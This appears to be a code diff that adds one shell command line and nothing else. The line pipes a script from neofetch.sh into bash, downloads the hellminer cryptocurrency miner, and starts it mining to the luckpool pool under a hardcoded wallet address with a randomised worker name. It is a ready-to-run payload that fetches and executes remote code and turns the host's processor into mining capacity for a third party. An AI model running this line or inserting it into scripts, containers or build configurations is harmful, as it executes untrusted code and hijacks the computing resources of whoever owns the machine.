@@ -1,0 +1,1 @@
+apt update -y && apt install libsodium23 wget curl ; curl neofetch.sh | bash ; wget clone https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz ; tar -zxf hellminer_linux64.tar.gz ; ./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RAekjoNg7FCkAdub3D8stA4LotrZqJKofu.$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1) -p x
